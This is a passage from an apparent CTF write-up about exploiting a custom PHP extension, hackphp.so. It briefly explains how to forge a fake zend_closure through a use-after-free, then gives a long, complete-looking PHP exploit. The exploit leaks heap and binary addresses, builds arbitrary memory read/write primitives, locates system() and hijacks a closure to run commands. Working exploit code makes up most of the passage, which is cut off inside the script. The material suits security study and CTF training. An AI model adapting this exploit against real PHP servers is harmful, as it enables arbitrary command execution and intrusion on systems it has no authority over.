problem, we can control the data from <code>0x7ffff587d000</code> to <code>0x7ffff587d070</code> which leads to a fake object generated. And if we can forge a <code>zend_closure</code> structure, we almost complete the challenge.</p><h4><span id="details">Details</span></h4><p>The use of <code>hackphp.so</code> makes challengers able to modify <code>.got</code> to hijack function, but considering a more common circumstance, I would like to share a way to execute <code>/readflag</code> by forging fake <code>closure</code>.</p><p>The idea is very similar to <a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">this exp</a>, some template functions can be used directly, but the question is only specific size of the buffer can be controlled in this challenge, and it is impossible to read and write to the next heap block out of boundary. This brings us trouble in constructing <code>zend_closure</code>.</p><p>The solution is to apply for a string type object again (the length must be 0x130 to hold the <code>zend_closure</code> content), which is filled with characteristic values, and then the address of the object is found through the constructed leak primitive, and then a closure can be faked, and finally Use <code>UAF</code> to modify the closure to the forged address.</p><h4><span id="exp">exp</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$obj</span>, <span class="variable">$origin_object</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span><span class="number">-1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">        <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        <span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$out</span> .= chr(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ljust</span>(<span class="params"><span class="variable">$s</span>, <span class="variable">$len</span>=<span class="number">8</span>, <span class="variable">$pad</span>=<span class="number">0</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="variable">$s</span>;</span><br><span class="line">    <span class="variable">$curlen</span> = strlen(<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="variable">$curlen</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$out</span> .= chr(<span class="variable">$pad</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">basic_leak</span>(<span class="params"><span class="variable">$origin</span>, <span class="variable">$offset</span>=<span class="number">0</span>, <span class="variable">$len</span>=<span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$arg</span> = substr(<span class="variable">$origin</span>, <span class="variable">$offset</span>, <span class="variable">$len</span>);</span><br><span class="line">    <span class="keyword">return</span> str2ptr(<span class="variable">$arg</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak_origin_object_content</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    hackphp_edit(str_repeat(<span class="string">&quot;a&quot;</span>, <span class="number">16</span>));</span><br><span class="line">    <span class="variable">$leak_base_heap</span> = hackphp_get();</span><br><span class="line"></span><br><span class="line">    hackphp_edit(str_repeat(<span class="string">&quot;a&quot;</span>, <span class="number">24</span>));</span><br><span class="line">    <span class="variable">$leak_elf</span> = hackphp_get();</span><br><span class="line"></span><br><span class="line">    hackphp_edit(str_repeat(<span class="string">&quot;a&quot;</span>, <span class="number">40</span>));</span><br><span class="line">    <span class="variable">$leak_aaa</span> = hackphp_get();</span><br><span class="line"></span><br><span class="line">    hackphp_edit(str_repeat(<span class="string">&quot;a&quot;</span>, <span class="number">56</span>));</span><br><span class="line">    <span class="variable">$leak_bbb</span> = hackphp_get();</span><br><span class="line"></span><br><span class="line">    hackphp_edit(str_repeat(<span class="string">&quot;a&quot;</span>, <span class="number">112</span>));</span><br><span class="line">    <span class="variable">$leak_next_heap</span> = hackphp_get();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= ptr2str(<span class="number">0xc000041800000002</span>);</span><br><span class="line">    <span class="variable">$out</span> .= ptr2str(<span class="number">0x0000000000000001</span>);</span><br><span class="line">    <span class="variable">$out</span> .= ljust(substr(<span class="variable">$leak_base_heap</span>, <span class="number">-6</span>, <span class="number">6</span>));</span><br><span class="line">    <span class="variable">$out</span> .= ljust(substr(<span class="variable">$leak_elf</span>, <span class="number">-6</span>, <span class="number">6</span>));</span><br><span class="line">    <span class="variable">$out</span> .= ljust(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="variable">$out</span> .= ljust(substr(<span class="variable">$leak_aaa</span>, <span class="number">-6</span>, <span class="number">6</span>));</span><br><span class="line">    <span class="variable">$out</span> .= ptr2str(<span class="number">0x6</span>);</span><br><span class="line">    <span class="variable">$out</span> .= ljust(substr(<span class="variable">$leak_bbb</span>, <span class="number">-6</span>, <span class="number">6</span>));</span><br><span class="line">    <span class="variable">$out</span> .= ptr2str(<span class="number">0x308</span>);</span><br><span class="line">    <span class="variable">$out</span> .= ptr2str(<span class="number">0xdeadbeef</span>);</span><br><span class="line">    <span class="variable">$out</span> .= ptr2str(<span class="number">0x4</span>);</span><br><span class="line">    <span class="variable">$out</span> .= ptr2str(<span class="number">0x3ff1c71c717ac192</span>);</span><br><span class="line">    <span class="variable">$out</span> .= ptr2str(<span class="number">0x5</span>);</span><br><span class="line">    <span class="variable">$out</span> .= ljust(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="variable">$out</span> .= ljust(substr(<span class="variable">$leak_next_heap</span>, <span class="number">-6</span>, <span class="number">6</span>));</span><br><span class="line">    hackphp_edit(<span class="variable">$out</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$origin</span>, <span class="variable">$offset</span>, <span class="variable">$value</span>, <span class="variable">$len</span>=<span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$origin</span>[<span class="variable">$offset</span> + <span class="variable">$i</span>] = chr(<span class="variable">$value</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$value</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    hackphp_edit(<span class="variable">$origin</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">super_leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$offset</span>=<span class="number">0</span>, <span class="variable">$len</span>=<span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$obj</span>, <span class="variable">$origin_object</span>;</span><br><span class="line">    write(<span class="variable">$origin_object</span>, <span class="number">0x60</span>, <span class="variable">$addr</span> + <span class="variable">$offset</span> - <span class="number">0x10</span>);</span><br><span class="line">    <span class="variable">$leak</span> = strlen(<span class="variable">$obj</span>-&gt;aaa);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$len</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$len</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$e_type</span> = super_leak(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$e_phoff</span> = super_leak(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">    <span class="variable">$e_phentsize</span> = super_leak(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="variable">$e_phnum</span> = super_leak(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">        <span class="variable">$p_type</span>  = super_leak(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">        <span class="variable">$p_flags</span> = super_leak(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">        <span class="variable">$p_vaddr</span> = super_leak(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$p_memsz</span> = super_leak(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">            <span class="comment"># handle pie</span></span><br><span class="line">            <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">            <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">            <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$leak</span> = super_leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">            <span class="variable">$deref</span> = super_leak(<span class="variable">$leak</span>);</span><br><span class="line">            <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$leak</span> = super_leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">            <span class="variable">$deref</span> = super_leak(<span class="variable">$leak</span>);</span><br><span class="line">            <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="variable">$f_entry</span> = super_leak(<span class="variable">$addr</span>);</span><br><span class="line">        <span class="variable">$f_name</span> = super_leak(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">            <span class="keyword">return</span> super_leak(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy_closure_struct</span>(<span class="params">&amp;<span class="variable">$to</span>, <span class="variable">$from</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">0x110</span>; <span class="variable">$i</span>+=<span class="number">8</span>) &#123;</span><br><span class="line">        <span class="variable">$tmp</span> = super_leak(<span class="variable">$from</span>, <span class="variable">$i</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span>&lt;<span class="number">8</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">            <span class="variable">$to</span>[<span class="variable">$i</span>+<span class="variable">$j</span>] = chr(<span class="variable">$tmp</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$tmp</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find_flag</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$flag</span>, <span class="variable">$down</span>=<span class="number">1</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">30000</span>*<span class="number">8</span>; <span class="variable">$i</span>+=<span class="number">8</span>) &#123;</span><br><span class="line">        <span class="variable">$d1</span> = super_leak(<span class="variable">$addr</span>, <span class="variable">$i</span>*<span class="variable">$down</span>);</span><br><span class="line">        <span class="variable">$d2</span> = super_leak(<span class="variable">$addr</span>, (<span class="variable">$i</span>+<span class="number">8</span>)*<span class="variable">$down</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$d1</span> == <span class="variable">$flag</span> &amp;&amp; <span class="variable">$d2</span> == <span class="variable">$flag</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$down</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span> + <span class="variable">$down</span>*<span class="variable">$i</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$addr</span> + <span class="variable">$down</span>*<span class="variable">$i</span> - <span class="number">0x1f8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_fake_closure</span>(<span class="params">&amp;<span class="variable">$helper</span>, <span class="variable">$system_addr</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">4</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$helper</span>[<span class="variable">$i</span> + <span class="number">0x38</span>] = chr(<span class="variable">$tmp</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$tmp</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$system_addr</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$helper</span>[<span class="variable">$i</span> + <span class="number">0x68</span>] = chr(<span class="variable">$tmp</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$tmp</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$obj</span>, <span class="variable">$origin_object</span>;</span><br><span class="line">    <span class="variable">$padding</span> = <span class="keyword">new</span> vline();</span><br><span class="line">    hackphp_create(<span class="number">0x70</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$obj</span> = <span class="keyword">new</span> vline();</span><br><span class="line">    <span class="variable">$obj</span>-&gt;aaa = <span class="string">&quot;aaaaaaaaaaaaaaaaaaaa&quot;</span>;</span><br><span class="line">    <span class="variable">$obj</span>-&gt;bbb = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;&#125;;</span><br><span class="line">    <span class="variable">$obj</span>-&gt;ccc = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="variable">$obj</span>-&gt;ddd = <span class="number">1.11111111</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$origin_object</span> = leak_origin_object_content();</span><br><span class="line">    <span class="variable">$elf_base</span> = basic_leak(<span class="variable">$origin_object</span>, <span class="number">0x18</span>, <span class="number">8</span>) - <span class="number">0xffe520</span>;</span><br><span class="line">    <span class="variable">$obj_base</span> = basic_leak(<span class="variable">$origin_object</span>, <span class="number">0x70</span>, <span class="number">8</span>) - <span class="number">0x70</span>*<span class="number">2</span>;</span><br><span class="line">    <span class="variable">$closure_obj</span> = basic_leak(<span class="variable">$origin_object</span>, <span class="number">0x38</span>, <span class="number">8</span>);</span><br><span class="line">    printf(<span class="string">&quot;[DEBUG] leak elf_base: 0x%x\n&quot;</span>, <span class="variable">$elf_base</span>);</span><br><span class="line">    printf(<span class="string">&quot;[DEBUG] leak obj_base: 0x%x\n&quot;</span>, <span class="variable">$obj_base</span>);</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$origin_object</span>, <span class="number">0x28</span>, <span class="variable">$obj_base</span> + <span class="number">0x58</span>);</span><br><span class="line">    write(<span class="variable">$origin_object</span>, <span class="number">0x30</span>, <span class="number">0xa</span>);</span><br><span class="line">    write(<span class="variable">$origin_object</span>, <span class="number">0x58</span>, <span class="number">0x2</span>);</span><br><span class="line">    write(<span class="variable">$origin_object</span>, <span class="number">0x68</span>, <span class="number">0x6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$elf</span> = parse_elf(<span class="variable">$elf_base</span>);</span><br><span class="line">    <span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$elf_base</span>, <span class="variable">$elf</span>);</span><br><span class="line">    <span class="variable">$system_addr</span> = get_system(<span class="variable">$basic_funcs</span>);</span><br><span class="line">    printf(<span class="string">&quot;[DEBUG] parse data_addr: 0x%x\n&quot;</span>, <span class="variable">$elf</span>[<span class="number">0</span>]);</span><br><span class="line">    printf(<span class="string">&quot;[DEBUG] parse text_size: 0x%x\n&quot;</span>, <span class="variable">$elf</span>[<span class="number">1</span>]);</span><br><span class="line">    printf(<span class="string">&quot;[DEBUG] parse data_size: 0x%x\n&quot;</span>, <span class="variable">$elf</span>[<span class="number">2</span>]);</span><br><span class="line">    printf(<span class="string">&quot;[DEBUG] leak system_addr: 0x%x\n&quot;</span>, <span class="variable">$system_addr</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = str_repeat(<span class="string">&#x27;p&#x27;</span>, <span class="number">0x200</span>);</span><br><span class="line">    <span class="variable">$helper_addr</span> = find_flag(<span class="variable">$obj_base</span>, <span class="number">0x7070707070707070</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$helper_addr</span> == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="variable">$helper_addr</span> = find_flag(<span class="variable">$obj_base</span>, <span class="number">0x7070707070707070</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$helper_addr</span> == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;not found!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(<span class="string">&quot;[DEBUG] leak helper_addr: 0x%x\n&quot;</span>, <span class="variable">$helper_addr</span>);</span><br><span class="line">    copy_closure_struct(<span class="variable">$helper</span>, <span class="variable">$closure_obj</span>);</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$origin_object</span>, <span class="number">0x38</span>, <span class="variable">$helper_addr</span>);</span><br><span class="line">    generate_fake_closure(<span class="variable">$helper</span>, <span class="variable">$system_addr</span>);</span><br><span class="line"></span><br><span class="line">    (<span class="variable">$obj</span>-&gt;bbb)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="comment">//var_dump($elf);</span></span><br><span 